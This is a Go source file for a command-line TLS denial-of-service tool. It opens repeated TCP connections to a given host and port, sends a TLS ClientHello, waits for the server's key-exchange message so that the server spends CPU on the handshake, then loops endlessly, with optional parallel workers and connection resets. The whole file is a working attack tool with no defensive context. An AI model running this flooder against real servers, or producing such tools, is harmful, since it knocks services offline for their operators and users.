package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
)

var options struct {
	verbose bool
	workers int
}

func init() {
	flag.BoolVar(&options.verbose, "v", false, "Verbose output")
	flag.IntVar(&options.workers, "workers", 0, "Number of additional worker go routines")
}

func sendTLSDoS(c *net.TCPConn) (bool, error) {
	array := make([]byte, len(clientHello))
	copy(array, clientHello)
	i := 0
	for i < len(array) {
		n, err := c.Write(array[i:])
		if err != nil {
			return false, err
		}
		i += n
	}
	if options.verbose {
		log.Println("Wrote ClientHello")
	}
	for {
		var header [5]byte
		_, err := io.ReadFull(c, header[:])
		if err != nil {
			return false, err
		}
		content := make([]byte, binary.BigEndian.Uint16(header[3:5]))
		_, err = io.ReadFull(c, content)
		if err != nil {
			return false, err
		}
		if header[0] != 22 {
			if options.verbose {
				log.Println("Invalid content type: ", header[0])
			}
			continue
		}
		if options.verbose {
			log.Println("Got handshake message type:", content[0])
		}
		if content[0] != 12 {
			continue
		}
		return true, nil
	}
}

func runTLSDoSInstance(addr *net.TCPAddr) {
	c, err := net.DialTCP("tcp", nil, addr)
	if err != nil {
		if options.verbose {
			log.Println("Error: ", err)
		}
		return
	}

	defer c.Close()

	//We can discard any data since we reset the connection
	c.SetLinger(0)
	for {
		_, err := sendTLSDoS(c)
		if err != nil {
			if options.verbose {
				log.Println(err)
			}
			return
		}
	}
}

func main() {
	flag.Parse()
	if flag.Arg(0) == "" {
		fmt.Printf("Usage: %s host:port [-v][-workers #]\n", os.Args[0])
		return
	}
	if options.verbose {
		fmt.Println("Resolving", flag.Arg(0))
	}
	addr, err := net.ResolveTCPAddr("tcp", flag.Arg(0))
	if err != nil {
		log.Println(err)
		return
	}
	if options.verbose {
		fmt.Println("Resolved!")
	}
	for i := 0; i < options.workers; i++ {
		go func() {
			for {
				runTLSDoSInstance(addr)
			}
		}()
	}
	for {
		runTLSDoSInstance(addr)
	}
}
